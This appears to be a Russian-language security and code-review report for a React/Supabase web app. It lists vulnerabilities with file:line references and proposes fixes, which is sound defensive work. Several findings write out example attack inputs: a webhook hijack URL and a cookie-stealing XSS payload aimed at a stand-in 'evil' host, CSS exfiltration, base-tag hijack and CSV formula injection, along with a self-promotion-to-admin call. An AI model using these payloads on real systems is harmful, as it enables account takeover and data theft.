# Future Screen — Code Review

**Date:** 2026-04-19
**Commit reviewed:** `75c9f6c` (main)
**Scope:** весь репо — `src/`, `api/`, `server/`, `supabase/`, `sql/`, конфиги, CI, публичные артефакты.
**Метод:** автоматическая проверка + ручной обход критичных модулей (auth, RLS, API handlers, CSP, формы).

Этот отчёт приносит **новые находки**, подкреплённые конкретными `file:line`, и не дублирует то что уже есть в устаревшем [AUDIT.md](AUDIT.md).

---

## Executive Summary

**Картина в целом.**

- **Безопасностный фронт — провал.** Несколько независимых уязвимостей складываются: любой залогиненный юзер становится админом за ~30 секунд через privilege escalation, после чего читает/удаляет PII всех лидов. Плюс две stored-XSS поверхности и unauthenticated Telegram webhook.
- **Архитектура** местами нормальная, местами тех-долг. React Query частично заменил `AdminDataContext`, но старый код (`useSiteSettings.ts`) живёт параллельно и расходится с новым.
- **Тесты есть, но не покрывают критику:** ни submit-form, ни RBAC, ни админ-CRUD, ни API-ручки.
- **CI/CD нет вообще.** После недавней утечки Supabase ключей в git-историю — это кричит. Нет pre-commit, нет gitleaks, нет husky.
- **`AUDIT.md` устарел на ~3 недели** — описывает несуществующий `AdminDataContext`, исправленные строки, неверные версии зависимостей.

**Приоритетная метрика:** 10 критических security-дыр. Каждая отдельно — уже плохо. Вместе — «любой пользователь = админ за минуту».

---

## 🔴 Critical — broken now or imminent

### C1. Telegram webhook admin actions — unauthenticated → bot takeover

[api/telegram-webhook.ts:710-736](api/telegram-webhook.ts#L710-L736) обрабатывает `GET ?action=setWebhook&url=...` и `?action=getWebhookInfo` **без единой проверки прав**. POST-путь (L745-751) чтит `TELEGRAM_WEBHOOK_SECRET`, но переменная **опциональна** (`if (webhookSecret)`). Атакующий делает `GET /api/telegram-webhook?action=setWebhook&url=https://evil.com/` → уводит бот себе.

**Фикс:**
- Требовать admin bearer token для GET-actions (паттерн `ensureAdmin` уже используется в visual-led-logs).
- Сделать `TELEGRAM_WEBHOOK_SECRET` обязательным на POST (500 если не задан, не no-op).

---

### C2. Privilege escalation — роль в `user_metadata` (writable by user)

[src/hooks/useUserRole.ts:26](src/hooks/useUserRole.ts#L26) и [sql/005_rbac_policies.sql:30-33](sql/005_rbac_policies.sql#L30-L33) читают роль из `user_metadata.role`. Supabase разрешает любому аутентифицированному вызвать `supabase.auth.updateUser({ data: { role: 'admin' } })` и самопромоутиться. Правильное место — `app_metadata` (server-only).

В комбинации с C3 — любой зарегистрированный пользователь становится full-admin за пару секунд.

**Фикс:**
- Мигрировать RBAC на `app_metadata` (или на server-side `profiles`-таблицу).
- Обновить RLS policies, которые читают `user_metadata`.
- В `resolveRole` (L26) поменять приоритет — `app_metadata` первым.

---

### C3. Почти ни на одном админ-маршруте нет role-gate

[src/App.tsx:95-107](src/App.tsx#L95-L107). Только `/admin/visual-led-logs` передаёт `requiredRole="admin"`. Маршруты:

- `/admin/leads`
- `/admin/cases`
- `/admin/packages`
- `/admin/categories`
- `/admin/contacts`
- `/admin/backgrounds`
- `/admin/rental-categories`
- `/admin/privacy-policy`
- `/admin` (index)

— все проверяют только `isAuthenticated`. Любой залогиненный viewer/editor читает все лиды (PII) и может очистить БД через `useClearLeadsMutation`.

**Фикс:** добавить `requiredRole="admin"` или `requiredRole="editor"` к каждому.

---

### C4. `leads` RLS даёт всем authenticated полный доступ (read/delete/update)

[supabase/migrations/20260220_setup_leads_storage.sql:28-29](supabase/migrations/20260220_setup_leads_storage.sql#L28-L29):
```sql
FOR ALL USING (auth.role() = 'authenticated')
```

В связке с C2 — любой зарегистрированный удаляет всех лидов, дампит PII, etc. Нет audit-trail на DELETE. [useClearLeadsMutation](src/queries/leads.ts#L43-L59) это просто `delete().not('id', 'is', null)` — без soft-delete, без recovery.

**Фикс:**
- Ограничить до `app_metadata.role = 'admin'` (после C2).
- Добавить `deleted_at` для soft-delete.
- Log в отдельную `audit_log` таблицу.

---

### C5. Anonymous INSERT в `leads` без server-side throttling

[supabase/migrations/20260220_setup_leads_storage.sql:24-25](supabase/migrations/20260220_setup_leads_storage.sql#L24-L25) — `Allow anonymous inserts ... WITH CHECK (true)`. А [src/lib/submitForm.ts:24-57](src/lib/submitForm.ts#L24-L57) **напрямую** вставляет через anon ключ до вызова `/api/send`. Атакующий пропускает `/api/send` вообще и пишет неограниченное количество строк в таблицу напрямую через public anon key. Rate-limit 10/15min в `api/send.ts` нерелевантен.

**Фикс (любой из):**
- Убрать клиентский `saveToLeads` — всю вставку делать server-side в `/api/send` через service-role.
- Добавить rate-limit constraint/policy на уровне Postgres.
- RLS `WITH CHECK` с проверкой issued `request_id`.

---

### C6. `site_settings`: миграция и код расходятся по ID → фон не работает у anon

Миграция [supabase/migrations/20260327_site_settings.sql:37-38](supabase/migrations/20260327_site_settings.sql#L37-L38) сидит row с `id='global'`, а код читает `id='default'`:
- [src/queries/siteSettings.ts:12](src/queries/siteSettings.ts#L12)
- [src/hooks/useSiteSettings.ts:32](src/hooks/useSiteSettings.ts#L32)
- [src/hooks/useSiteSettings.ts:75](src/hooks/useSiteSettings.ts#L75)

Либо в prod руками пересоздали row с `'default'` (миграция не воспроизводима), либо фича custom background **сломана для не-админов навсегда**.

**Фикс:** договориться на один ID, обновить миграцию или код, убить `useSiteSettings.ts` (см. C7).

---

### C7. `useSiteSettings` — dead code, дублирует `useSiteSettingsQuery`

[src/hooks/useSiteSettings.ts:1-153](src/hooks/useSiteSettings.ts#L1-L153) и [src/context/SiteSettingsContext.tsx:9](src/context/SiteSettingsContext.tsx#L9) — Context ещё импортирует legacy-хук со своей Supabase-подпиской, ручным `useState` и неправильным id `'default'`. Параллельно [src/queries/siteSettings.ts](src/queries/siteSettings.ts) — React-Query версия, которую инвалидируют admin-мутации.

Итог: админ сохраняет настройки через React Query mutation, а публичный сайт читает legacy-хук — они **никогда не сходятся**. Realtime-подписка (L119-134) частично маскирует проблему.

**Фикс:** удалить `useSiteSettings.ts`, Context потребляет `useSiteSettingsQuery`.

---

### C8. Stored XSS в `/reports/:slug` — HTML пользователя рядом с основной CSP

[api/report-share.ts:54-61](api/report-share.ts#L54-L61) — «санитайзер» это
```ts
if (html.toLowerCase().includes('<script')) { ... }
```

Обходится тривиально: `<SCR\u0049PT>`, `<script\x20...`, любые event handlers (`<img src=x onerror=fetch('//evil/'+document.cookie)>`, `<iframe srcdoc>`, etc.).

[L86-L90](api/report-share.ts#L86-L90) отдаёт хранёный HTML «как есть» с `Content-Type: text/html`, на **том же origin** что и SPA. Основная CSP в [vercel.json:59](vercel.json#L59) с `'unsafe-inline' 'unsafe-eval'` применяется → атакующий загружает HTML с `<img onerror>`, ворует Supabase anon key / session tokens у любого юзера кто откроет ссылку.

**Фикс:**
- Server-side DOMPurify при вставке (не просто `.includes('<script')`).
- `Content-Security-Policy: sandbox allow-same-origin` на `/reports/*` (или отдельный origin).
- `X-Content-Type-Options: nosniff`.
- Restrictive CSP на эти страницы отдельно.

---

### C9. Дубль CSP (index.html + vercel.json), `connect-src` пускает любой ws/wss

[index.html:31-41](index.html#L31-L41) имеет `<meta>` CSP с dev-origins (`*.replit.dev`, `ws://localhost:*`) и — критично — **`ws: wss:`**, то есть разрешён ЛЮБОЙ websocket endpoint. Дев-значения протекли в prod. `frame-src` отличается от `vercel.json` (разрешает yandex.com).

Браузер пересекает обе CSP и берёт самую строгую, так что хедер-CSP может перевесить — но полагаться на это хрупко, плюс дев-разрешения в HTML неприятный артефакт.

**Фикс:** убрать `<meta>` CSP, оставить только header CSP в `vercel.json`, ужесточить `connect-src` до именованных хостов.

---

### C10. CSP без `object-src`, `base-uri`, `form-action` — возможен base-tag hijack

[vercel.json:59](vercel.json#L59) — нет:
- `base-uri 'self'`
- `form-action 'self'`
- `object-src 'none'`
- `upgrade-insecure-requests`

Injected `<base href="https://evil.com/">` перенаправит любой relative URL. Плюс нет HSTS-хедера.

**Фикс:** добавить все четыре директивы + `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`.

---

## 🟠 High — real degradation/risk

### H1. `useStarBorderGlobal` — MutationObserver на `document.body` без throttle

[src/hooks/useStarBorderGlobal.ts:72-89](src/hooks/useStarBorderGlobal.ts#L72-L89): наблюдатель с `subtree: true, childList: true` → запускает `applyStarBorder` при любом DOM-change где угодно. Внутри — 3 `document.querySelectorAll`, обходящих всё дерево. Работает на каждой странице. Видимый джанк на страницах с streaming-контентом.

**Фикс:** debounce (rAF), ограничить скоупом content-root, или перенести на pure CSS `:hover`.

---

### H2. PII утекает в Yandex.Metrika

[src/components/RequestForm.tsx:63](src/components/RequestForm.tsx#L63):
```ts
trackEvent('submit_form', { pagePath: ..., ...values })
```

Спредит полный form payload (имя, телефон, email, telegram, comment, поле `honey`) в Yandex-goals. 152-ФЗ и GDPR implications. Заодно раскрывает имя honeypot-поля — боты быстро учатся его игнорировать.

**Фикс:** слать только non-PII метаданные — `{ pagePath, hasEmail: !!values.email }`.

---

### H3. Rate-limits в памяти → не работают на Vercel serverless

[api/send.ts:18](api/send.ts#L18), [api/client-log.ts:12](api/client-log.ts#L12): `const requestsByIp = new Map()`. Каждый cold-isolate — отдельный Map. Либо лимит эффективно «не существует» (новый cold-start на каждый запрос), либо случайно срабатывает (warm-start). Атакующий бьёт до тех пор пока новый isolate не поднимется.

**Фикс:** Upstash KV или Vercel KV (Redis). `AUDIT.md` упоминает это общо, но не отмечает что реализация **фактически no-op**.

---

### H4. `api/send.ts` падает на ANON ключ для service-role задач

[api/send.ts:82](api/send.ts#L82) и [api/telegram-webhook.ts:93](api/telegram-webhook.ts#L93): `SUPABASE_SERVICE_ROLE_KEY || VITE_SUPABASE_ANON_KEY`. Если service-role env забыта — тихо работает на anon. Потом `UPDATE leads` в [api/send.ts:236-239](api/send.ts#L236-L239) падает (anon не имеет UPDATE), лид залипает в `processing` навсегда, `delivery_log` не пишется.

**Фикс:** throw на boot если `SUPABASE_SERVICE_ROLE_KEY` отсутствует, никакого fallback.

---

### H5. `api/visual-led/analyze.ts` — нет origin check, нет rate-limit, 67 МБ payload

[api/visual-led/analyze.ts:22-30](api/visual-led/analyze.ts#L22-L30): CORS echoes любой origin. [L8](api/visual-led/analyze.ts#L8) Zod-schema разрешает `rgba: array of int` до `4096 × 4096 × 4 = 67M` элементов → десятки МБ JSON парсятся в Uint8ClampedArray. DoS: атакующий постит с любого origin, 1 запрос = сотни МБ памяти, сервер OOM на free tier.

**Фикс:** origin-allowlist как в send.ts, persistent rate-limit, ограничить `rgba.length` в Zod, принимать binary вместо JSON-массива.

---

### H6. `api/visual-led/save.ts` — no-op заглушка

[api/visual-led/save.ts:30-45](api/visual-led/save.ts#L30-L45): принимает `{sceneId, state}`, валидирует, возвращает `{ok: true, savedAt}` — **ничего не сохраняет**. Либо dead code, либо тихо сломано. Клиент полагающийся на это теряет данные.

**Фикс:** удалить или имплементировать.

---

### H7. `shared_reports` — нет TTL и size-budget

[supabase/migrations/20260410_create_shared_reports.sql](supabase/migrations/20260410_create_shared_reports.sql) хранит до 4 МБ HTML на row ([api/report-share.ts:14](api/report-share.ts#L14)) без expire. POST без rate-limit, без enforce origin (H8) — таблица растёт бесконечно.

**Фикс:** `expires_at` column, daily cron DELETE, rate-limit на POST, обязательный origin.

---

### H8. `report-share` принимает пустой/отсутствующий Origin

[api/report-share.ts:33-37](api/report-share.ts#L33-L37) `isOriginAllowed` возвращает `true` когда origin пустой. curl и скрипты без Origin header обходят allowlist. Та же проблема в [api/send.ts:51-56](api/send.ts#L51-L56) и [api/client-log.ts:26-31](api/client-log.ts#L26-L31).

**Фикс:** reject missing Origin на POST.

---

### H9. `site_content` RLS `TO authenticated` → anon не видит публичную privacy-policy

[sql/003_create_site_content.sql:36-39](sql/003_create_site_content.sql#L36-L39) и [sql/005_rbac_policies.sql:56-60](sql/005_rbac_policies.sql#L56-L60): SELECT ограничен до `TO authenticated`. [src/pages/PrivacyPolicyPage.tsx:11](src/pages/PrivacyPolicyPage.tsx#L11) вызывает `usePrivacyPolicyQuery` с anon-key → 0 rows → fallback. Если на DB-контент завязана реальная политика конфиденциальности, анон-посетители её не видят.

**Фикс:** `FOR SELECT USING (is_published = true)` или `TO anon, authenticated`.

---

### H10. DOMPurify позволяет `style` глобально → CSS-injection и exfil

[src/lib/sanitize.ts:55-60](src/lib/sanitize.ts#L55-L60): `allowedAttributes['*'] = ['class','id','style']`. `style` на `<img>`/`<a>` открывает:
- `background-image: url(https://evil.com/?cookie=...)` — exfil через request URL.
- `position:fixed` overlays.
- Прочие CSS-based attacks.

Плюс `a: ['href','title','target','rel']` позволяет `target="_blank"` без форсированного `rel="noopener"`.

**Фикс:** убрать `style` из allowed; hook на URL-атрибуты форсит `rel="noopener noreferrer nofollow"`.

---

### H11. Нет корневого ErrorBoundary; существующий orphan

[src/components/ErrorBoundary.tsx](src/components/ErrorBoundary.tsx) импортируется **ноль раз**. [src/main.tsx:26-44](src/main.tsx#L26-L44) не оборачивает `<App>`. Любая render-ошибка валит всё дерево.

**Фикс:** обернуть `<App>` и каждый `<Suspense>` boundary.

---

### H12. `clientErrorLogger` monkey-patches `console.error` → log-флуд

[src/lib/clientErrorLogger.ts:62-84](src/lib/clientErrorLogger.ts#L62-L84) переопределяет `window.console.error`. Любая сторонняя библиотека (React, Supabase, react-hot-toast, Yandex-Metrika) которая логирует warning → стучит в `/api/client-log`. Без сэмплинга, без dedup. 30/min-лимит забивается быстро.

**Фикс:** sample, dedup по stack-hash, слать только uncaught + explicit `logger.report()`, не трогать console.

---

### H13. Direct-DOM writes внутри React-компонентов

[src/pages/HomePage.tsx:14-29](src/pages/HomePage.tsx#L14-L29) мутирует `el.style.opacity` в эффекте. [src/components/Header.tsx:59-63](src/components/Header.tsx#L59-L63) ставит `event.currentTarget.style.color` на mouseover (React решил бы через class). Сам по себе терпимо, но в связке с H1 MutationObserver создаёт render-loops.

---

### H14. RLS включён, но нет policies на `visual_led_*` таблицах

[supabase/migrations/20260412170000_visual_led_logging.sql:86-88](supabase/migrations/20260412170000_visual_led_logging.sql#L86-L88) включает RLS на `visual_led_sessions`, `visual_led_events`, `visual_led_assets` без policy. Только service-role работает. Клиентская [AdminVisualLedLogsPage.tsx:266](src/pages/admin/AdminVisualLedLogsPage.tsx#L266) корректно ходит через API с bearer token, но если миграция случайно поменяется — молча залочит админа без surface для ошибки.

**Фикс:** documented policy-комментарии или явные policies.

---

### H15. Нет миграций для таблиц используемых в коде

`cases`, `categories`, `packages`, `contacts`, `telegram_sessions`, `telegram_processed_messages` — упоминаются в `src/queries/*.ts` и [api/telegram-webhook.ts:147-218](api/telegram-webhook.ts#L147-L218). Ноль CREATE TABLE в `sql/` или `supabase/migrations/`. Реплицировать БД из свежего клона **невозможно**.

**Фикс:** `supabase db pull` или написать явные миграции.

---

### H16. Нет CI/CD, нет pre-commit secrets scan

Пустой `.github/workflows/`, нет `.husky/`, нет `lint-staged`, нет `gitleaks`/`trufflehog`. Недавно был инцидент утечки Supabase-ключей в git-историю — ничего не препятствует повторению. В `package.json` есть `check:prepush` скрипт — но dev-ы не обязаны его запускать.

**Фикс:**
- GitHub Actions (lint + test на PR).
- husky pre-commit с `npx lint-staged` + `gitleaks protect --staged`.

---

## 🟡 Medium — improvement opportunities

### M1. Мутация module-level state во время render

[src/pages/admin/AdminLeadsPage.tsx:11-12, 305-306](src/pages/admin/AdminLeadsPage.tsx#L11-L12): `let adminLeadsContent = ...`, `let localeTag = ...` переприсваиваются внутри тела компонента. Ломает StrictMode double-render, Suspense retries, concurrent rendering.

**Фикс:** `useMemo` / `useI18n`.

---

### M2. Context value не мемоизированы

[src/context/AuthContext.tsx:58](src/context/AuthContext.tsx#L58), [src/context/ThemeContext.tsx:31](src/context/ThemeContext.tsx#L31) — новый object literal на каждый render в `value={...}` → все consumers re-render на каждый render provider'а. `I18nContext` правильно мемоизирован, эти два — нет.

---

### M3. `useFocusTrap` returnFocus в неверной lifecycle

[src/hooks/useFocusTrap.ts:48-55](src/hooks/useFocusTrap.ts#L48-L55): cleanup проверяет `if (!active)` — но cleanup-ы уже запускаются на deps-change или unmount. Intended behavior («focus возвращается когда модалка закрывается») срабатывает по неверным причинам.

**Фикс:** `useRef` предыдущего `active`, refocus только на transition `true → false`.

---

### M4. `useLeadsQuery` грузит всю таблицу leads без пагинации

[src/queries/leads.ts:15-28](src/queries/leads.ts#L15-L28): `supabase.from('leads').select('*').order(...)`. На 10k строк — минуты сети и рендера. Плюс [useLeads.ts:10](src/hooks/useLeads.ts#L10): `leadsRaw?.map(mapLeadFromDB) ?? []` без `useMemo` — каждый render новый массив.

**Фикс:** `range()` пагинация, `useMemo`, виртуализация UI.

---

### M5. `useMediaLibraryQuery` / `useMediaTagsQuery` без лимитов

[src/queries/mediaLibrary.ts:30-75](src/queries/mediaLibrary.ts#L30-L75) без limit. [L101-L121](src/queries/mediaLibrary.ts#L101-L121) тянет `tags` со всех row для Set-dedupe на клиенте. На 1000+ медиа — мегабайты для одного списка фильтров.

**Фикс:** пагинация, SQL-view/RPC `media_tags_distinct`.

---

### M6. `useMediaUpload` вызывает `listBuckets()` на каждый файл

[src/hooks/useMediaUpload.ts:82-90](src/hooks/useMediaUpload.ts#L82-L90): bucket-exists check внутри per-file цикла.

**Фикс:** кэшировать результат один раз.

---

### M7. Three.js + OGL + неиспользуемый postprocessing — нет chunk-split

[package.json:46,54](package.json#L46): `three` + `ogl` + [`postprocessing`](package.json#L47) (~300 КБ, **нигде не импортируется** в `src/`). [vite.config.ts:26-30](vite.config.ts#L26-L30) `manualChunks` не содержит `three`/`ogl`.

**Фикс:**
- Удалить `postprocessing`.
- Добавить `three`/`ogl` в manualChunks.
- Lazy-load только на страницах с backgrounds.

---

### M8. `reportCompressedSize: true` → медленный build

[vite.config.ts:33](vite.config.ts#L33). Секунды на каждый CI build. Поставить `false`.

---

### M9. `.gitignore *.js` слишком широко

[.gitignore:7](.gitignore#L7). Риск: случайное игнорирование будущих `server/*.js`. Уже tracked — выживают, новые — нет.

**Фикс:** сузить до `src/**/*.js` или удалить.

---

### M10. Нет HSTS / Permissions-Policy / COOP / CORP

[vercel.json:55-73](vercel.json#L55-L73) отсутствуют:
- `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`
- `Permissions-Policy: camera=(), microphone=(), geolocation=(), interest-cohort=()`
- `Cross-Origin-Opener-Policy: same-origin`
- `Cross-Origin-Resource-Policy: same-origin`

---

### M11. Компоненты-монстры

| Файл | Строк |
|------|-------|
| [HomePage.tsx](src/pages/HomePage.tsx) | 834 |
| [AdminCasesRedesignedPage.tsx](src/pages/admin/AdminCasesRedesignedPage.tsx) | 738 |
| [AdminVisualLedLogsPage.tsx](src/pages/admin/AdminVisualLedLogsPage.tsx) | 611 |
| [AdminLeadsPage.tsx](src/pages/admin/AdminLeadsPage.tsx) | 579 |
| [AdminRentalCategoryEditPage.tsx](src/pages/admin/AdminRentalCategoryEditPage.tsx) | 577 |

HomePage содержит inline SVG-словарь, форму, scroll-reveal hook и page-секции в одном файле. Разбить каждый на папку из composable-компонентов.

---

### M12. CSV export уязвим к formula-injection

[src/pages/admin/AdminLeadsPage.tsx:392-407](src/pages/admin/AdminLeadsPage.tsx#L392-L407): `lead.name`, `lead.phone`, `lead.comment` сериализуются «как есть». Лид с `name = "=HYPERLINK(...)"` выполняется в Excel/LibreOffice. Разделитель `;` без escape для внутренних `;`. Только `comment` в кавычках ([L406](src/pages/admin/AdminLeadsPage.tsx#L406)).

**Фикс:** префиксить клетки начинающиеся с `=+-@\t\r` апострофом, кавычить все поля одинаково.

---

### M13. Honeypot `display:none` — средне-эффективный

[src/components/RequestForm.tsx:95](src/components/RequestForm.tsx#L95): `className="hidden"`. Современные спам-тулкиты распознают `display:none`.

**Фикс:** visually-hidden но focusable-out CSS + timing-check (`honey_start_ts`).

---

### M14. Третья форма (`CtaForm`) в HomePage — вообще без honeypot

[src/pages/HomePage.tsx:418-549](src/pages/HomePage.tsx#L418-L549). Дублирует логику `RequestForm`, но без honey. Несогласованно.

---

### M15. `consent` не валидируется server-side в `CtaForm`

[src/pages/HomePage.tsx:529](src/pages/HomePage.tsx#L529) использует `!consent` только в `disabled=`. Если отключить JS или ассистивка обходит — submit пойдёт в `submitForm` без проверки consent.

**Фикс:** enforce server-side в `/api/send`.

---

### M16. Playwright — только Chromium desktop

[playwright.config.ts:15-20](playwright.config.ts#L15-L20). Нет Firefox, WebKit, mobile. WebGL + iframe `/visual-led` почти гарантированно имеют Safari-edge-cases.

---

### M17. Нет vitest `setupFiles` — `@testing-library/jest-dom` matchers не загружены

[vitest.config.ts:4-11](vitest.config.ts#L4-L11). Тесты проходят потому что никто не использует `.toBeInTheDocument()` — как только кто-то напишет, молча упадёт с невнятной ошибкой.

**Фикс:** `setupFiles: ['./vitest.setup.ts']` с `import '@testing-library/jest-dom/vitest'`.

---

### M18. Ноль тестов на критичную бизнес-логику

Есть: `screenMath`, `sanitize`, `emailCore` парсинг, ConfirmModal, один hook.

Нет:
- `submitForm` — критический лид-путь
- `useLeads` мутации
- `useMediaUpload`
- RBAC (`useUserRole`) — особенно path privilege-escalation
- `AdminLeadsPage` filter/export
- `processEmailSubmission` honeypot-handling
- **Ни одного API handler test** в `api/**.test.ts`

---

### M19. Дублирование email/Telegram между `api/` и `server/`

[api/send.ts:328-398](api/send.ts#L328-L398) реимплементирует `formatTelegramMessage`, `formatEmailFailureAlertMessage`, `sendEmail` при этом **также** импортирует `processEmailSubmission` из `server/lib/emailCore.js`. `server/lib/emailCore.js` имеет свой `formatTelegramMessage`, `buildAdminEmailMessage`. Две параллельные имплементации дрейфуют.

**Фикс:** один источник истины в `server/lib/emailCore.js`, удалить дубли из `api/send.ts`.

---

### M20. `<Link target="_blank">` без `rel="noopener noreferrer"`

[src/components/ConsentCheckbox.tsx:33](src/components/ConsentCheckbox.tsx#L33). React-Router `<Link>` не авто-добавляет `rel`. Reverse-tabnabbing risk.

---

### M21. Mobile menu — нет focus-trap, `aria-expanded`, Esc-close

[src/components/Header.tsx:217-232](src/components/Header.tsx#L217-L232). Кнопка тоглит state, но:
- Нет `aria-expanded`.
- Нет focus-trap на open.
- Esc не закрывает.
- Клик снаружи не закрывает.

---

### M22. Rental dropdown — hover-only, keyboard-inaccessible

[src/components/Header.tsx:148-156](src/components/Header.tsx#L148-L156): открывается только на `onMouseEnter`. Клавиатурные и screen-reader пользователи не могут открыть.

---

### M23. `LazyImage` + CLS

[src/components/LazyImage.tsx:40-45, 59-66](src/components/LazyImage.tsx#L40-L66): observer на wrapper вместо `<img>`. Плюс все админские `<img>` в MediaCard/MediaLibrary без `width/height` → layout shift при загрузке.

---

### M24. `ReactBitsLazy.tsx` форсит `any` на все backgrounds

[src/components/backgrounds/ReactBitsLazy.tsx:9-28](src/components/backgrounds/ReactBitsLazy.tsx#L9-L28): каждый cast `as ComponentType<any>` потому что `.jsx` файлы не типизированы. Ноль TS-проверки на props.

**Фикс:** конвертировать `.jsx` → `.tsx` с типизированными props.

---

### M25. `useFocusTrap` deps неполные

[src/hooks/useFocusTrap.ts:58-74](src/hooks/useFocusTrap.ts#L58-L74): `useEffect` зависит только от `[active]`, не от `containerRef.current`. Если ref указывает на новый DOM-node между рендерами — trap привязан к старому элементу.

---

### M26. `document.documentElement.lang` гонка со статичным `<html lang="ru">`

[index.html:2](index.html#L2) захардкожен `lang="ru"`. [src/App.tsx:78-80](src/App.tsx#L78-L80) мутирует post-hydration. Краулеры видят начально `ru`; en-пользователи на момент hydration получают ru meta.

---

### M27. Realtime-подписка `site_settings` не отписывается корректно на HMR

[src/hooks/useSiteSettings.ts:115-139](src/hooks/useSiteSettings.ts#L115-L139): channel `site_settings_changes` — Supabase ругается на duplicate-channel между hot-reloads.

**Фикс:** UUID suffix или переиспользовать через query-client (после удаления legacy-хука, см. C7).

---

### M28. `report-share` slug collision — TOCTOU race

[api/report-share.ts:72-84](api/report-share.ts#L72-L84): SELECT потом INSERT (нет fallback на constraint-violation). Два параллельных POST могут оба пройти SELECT. PK на `slug` ([migration:2](supabase/migrations/20260410_create_shared_reports.sql#L2)) поймает, но вернёт generic 500.

**Фикс:** skip preflight SELECT — INSERT и ловить unique-violation.

---

### M29. AUDIT.md указывает на несуществующий файл

AUDIT.md утверждает что `AdminContentPage.tsx` имеет неиспользуемые `cases`, `deleteCase` и т.п. Файл теперь [src/pages/admin/AdminContentIndexPage.tsx](src/pages/admin/AdminContentIndexPage.tsx) — audit указывает на старый путь. Grep подтверждает: текущий файл просто index-страница.

---

### M30. AUDIT.md устарел на 3 недели

- Утверждает `AdminDataContext` 427 строк — **не существует**, заменён на React Query.
- `useContacts.ts:13` с `|| baseContacts` fallback — такой строки больше нет.
- «Supabase types не auto-generated» — `database.types.ts` auto-gen'd с header-комментом.
- Listing `vitest@4.1.1`; `package.json` → 1.6.0.

Удалить устаревшие секции или переписать.

---

## 🟢 Polish — nice-to-have

### P1. `attached_assets/image_1775152191214.png` — 3.9 МБ committed binary

[attached_assets/](attached_assets/). Никогда не упоминается в `src/`.

### P2. `design-archive/` — целый Next.js проект (1.4 МБ)

[design-archive/](design-archive/). Свой `package.json`, `next.config.mjs`, etc. В отдельную ветку/тег или удалить.

### P3. `artifacts/mockup-sandbox/` — 12 МБ

[artifacts/](artifacts/). Должно быть в `.gitignore`.

### P4. `coverage/` (387 КБ) в git

[coverage/](coverage/). В `.gitignore` и очистить.

### P5. `test-results/` в git

[test-results/](test-results/). Playwright-output не коммитят.

### P6. `public/visual-led/index.html` — 3481-строчный монолит

HTML + inline JS + inline styles в одном файле. Тяжело ревьюить и диффать.

### P7. Нет prettier / lint-staged

### P8. `console.info` в production analytics

[src/lib/analytics.ts:19](src/lib/analytics.ts#L19). Спамит console.

### P9. `console.log` в `useSiteSettings` и `imageCompression`

[src/hooks/useSiteSettings.ts:52,130](src/hooks/useSiteSettings.ts#L52).

### P10. Stale planning docs

[plans/REFACTORING_PLAN.md](plans/REFACTORING_PLAN.md) (март 2026), [docs/SUPABASE_AUDIT.md](docs/SUPABASE_AUDIT.md) (февраль 2026) — описывают исправленные проблемы. В `docs/archive/` или удалить.

### P11. `@types/node@25.3.0` — Node 25 types; Vercel Node 22

[package.json:65](package.json#L65). Minor mismatch в fetch-типизации.

### P12. `site_settings.background_settings` — arbitrary JSONB без constraint

[supabase/migrations/20260327_site_settings.sql:5](supabase/migrations/20260327_site_settings.sql#L5). Добавить `CHECK (jsonb_typeof(...) = 'object' AND octet_length(...::text) < 65536)`.

### P13. `backgrounds/reactbits/*.jsx` mixed с `.tsx`

Strict-TS проект — `.jsx` обходят type-check. Конвертировать.

### P14. Preload шрифтов блокирует render

[index.html:13](index.html#L13). `rel="stylesheet"` блокирует. Либо `media="print" onload="this.media='all'"`, либо self-host.

### P15. `.replit` закоммичен

Dev-flow на Vercel — удалить если не используется.

### P16. Honeypot schema / processEmailSubmission расходятся

[server/lib/emailCore.js:296-306](server/lib/emailCore.js#L296-L306) проверяет `rawBody.honey`, но Zod-schema в [api/send.ts:93-104](api/send.ts#L93-L104) не включает `honey` в схему. Если schema `.strict()` — поле режется, honeypot не сработает. Сейчас не strict — проходит, но тонко.

### P17. `vercel.json` — нет pin runtime

[vercel.json:2](vercel.json#L2). Нет `functions.{...}.runtime` блока.

### P18. Нет bundle-analyzer

`rollup-plugin-visualizer` для one-off inspect three.js/ogl chunks.

---

## Рекомендованный план действий

### Срочно (1-2 дня работы — security incident)

Без этого репо в проде — таймбомба:

1. **C2 + C3** — переехать на `app_metadata` для RBAC, добавить `requiredRole` на все админ-роуты. Взаимосвязанные, делать вместе.
2. **C4** — ужесточить RLS `leads` (только admin), добавить `deleted_at`.
3. **C5** — убрать клиентский direct INSERT в `leads`, вся вставка через `/api/send` с service-role.
4. **C1** — auth на GET-actions `telegram-webhook.ts`, обязательный `TELEGRAM_WEBHOOK_SECRET` на POST.
5. **C8** — server-side DOMPurify в `report-share.ts`, sandbox CSP на `/reports/*`.
6. **H3** — Upstash KV для rate-limits (без этого весь anti-flood — театр).
7. **H4** — throw на missing `SUPABASE_SERVICE_ROLE_KEY`, убрать fallback на anon.

### Через неделю

- **H15** — миграции для `cases`, `categories`, `packages`, `contacts`, telegram-таблиц. Без них клон→БД не воспроизводится.
- **H16** — GitHub Actions CI + husky pre-commit + gitleaks. После недавней утечки ключей — обязательно.
- **C6 + C7** — фикс id mismatch `site_settings`, удалить `useSiteSettings.ts`.
- **H11** — обернуть `<App>` в ErrorBoundary.
- **C9 + C10** — убрать `<meta>` CSP, добавить `base-uri`/`form-action`/`object-src`/HSTS в `vercel.json`.
- **M18** — тесты на `submitForm` + `useUserRole` (~50 строк, защищают критику).

### Когда дойдут руки

- **M19** — объединить `api/send.ts` и `server/lib/emailCore.js`, убрать дубли.
- **M11** — раздробить `HomePage.tsx`, `AdminCasesRedesignedPage.tsx`, `AdminLeadsPage.tsx`.
- **M4 + M5** — pagination на leads и media.
- **M7** — удалить `postprocessing`, chunk-split `three`/`ogl`.
- **P1-P5** — почистить `attached_assets/`, `design-archive/`, `coverage/`, `test-results/` из git.
- **M30** — переписать или удалить устаревшие секции `AUDIT.md`.

---

## Сводка deltas vs AUDIT.md

Новые находки, которых **нет** в AUDIT.md:

- C1 — Telegram webhook GET auth
- C2 — `user_metadata` privilege escalation
- C3 — отсутствующие role-gates
- C5 — anon direct-insert bypass
- C6 — `site_settings` id mismatch
- C7 — дублирующие settings hooks
- C8 — stored-XSS в shared reports
- C9 + C10 — CSP проблемы

Находки расширяющие generic checkboxes AUDIT.md конкретными file:line:

- H2 (PII в analytics) — точка утечки `RequestForm.tsx:63`.
- H1 (MutationObserver) — конкретный файл и стоимость.
- H3 (in-memory rate-limit) — отмечено что на serverless **фактически no-op**.
